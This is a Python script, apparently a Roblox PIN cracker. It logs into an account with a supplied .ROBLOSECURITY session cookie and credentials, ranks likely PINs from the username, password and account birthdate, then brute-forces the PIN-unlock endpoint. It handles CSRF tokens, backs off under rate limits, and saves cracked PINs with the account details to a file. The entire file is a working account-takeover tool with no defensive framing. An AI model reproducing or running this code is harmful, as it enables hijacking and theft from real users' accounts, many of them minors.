import time
import ctypes
import requests
from threading import Thread

account = input(
    'Enter your user:pass:cookie.\n'
    'No user:pass? Just do something like random:poop:<cookie>\n'
    '--> '
)

try: username, password, cookie = account.split(':',2)
except:
    input('INVALID FORMAT >:(')
    exit()

req = requests.Session()
req.cookies['.ROBLOSECURITY'] = cookie
try:
    r = req.get('https://www.roblox.com/mobileapi/userinfo').json()
    userid = r['UserID']
except:
    input('INVALID COOKIE')
    exit()

print('Logged in.\n')


r = requests.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv').text
pins = [x.split(',')[0] for x in r.splitlines()]
print('Loaded most common pins.')

r = req.get('https://accountinformation.roblox.com/v1/birthdate').json()
month = str(r['birthMonth']).zfill(2)
day = str(r['birthDay']).zfill(2)
year = str(r['birthYear'])

likely = [username[:4], password[:4], username[:2]*2, password[:2]*2, username[-4:], password[-4:], username[-2:]*2, password[-2:]*2, year, day+day, month+month, month+day, day+month]
likely = [x for x in likely if x.isdigit() and len(x) == 4]
for pin in likely:
    pins.remove(pin)
    pins.insert(0, pin)

print(f'Prioritized likely pins {likely}\n')

sleep = 0
tried = 0

while 1:
    pin = pins.pop(0)
    ctypes.windll.kernel32.SetConsoleTitleW(f'PIN CRACKER | Tried: {tried}/9999 | Current pin: {pin}')
    try:
        r = req.post('https://auth.roblox.com/v1/account/pin/unlock', json={'pin': pin})
        if 'X-CSRF-TOKEN' in r.headers:
            pins.insert(0, pin)
            req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
        elif 'errors' in r.json():
            code = r.json()['errors'][0]['code']
            if code == 0 and r.json()['errors'][0]['message'] == 'Authorization has been denied for this request.':
                print(f'[FAILURE] Account cookie expired.')
                break
            elif code == 1:
                print(f'[SUCCESS] NO PIN')
                with open('cracked.txt','a') as f:
                    f.write(f'NO PIN:{account}\n')
                break
            elif code == 3:
                pins.insert(0, pin)
                sleep += 1
                if sleep == 5:
                    sleep = 0
                    time.sleep(300)
            elif code == 4:
                tried += 1
        elif 'unlockedUntil' in r.json():
            print(f'[SUCCESS] {pin}')
            with open('cracked.txt','a') as f:
                f.write(f'{pin}:{account}\n')
            break
        else:
            print(f'[ERROR] {r.text}')
            pins.append(pin)
    except Exception as e:
        print(f'[ERROR] {e}')
        pins.append(pin)

input()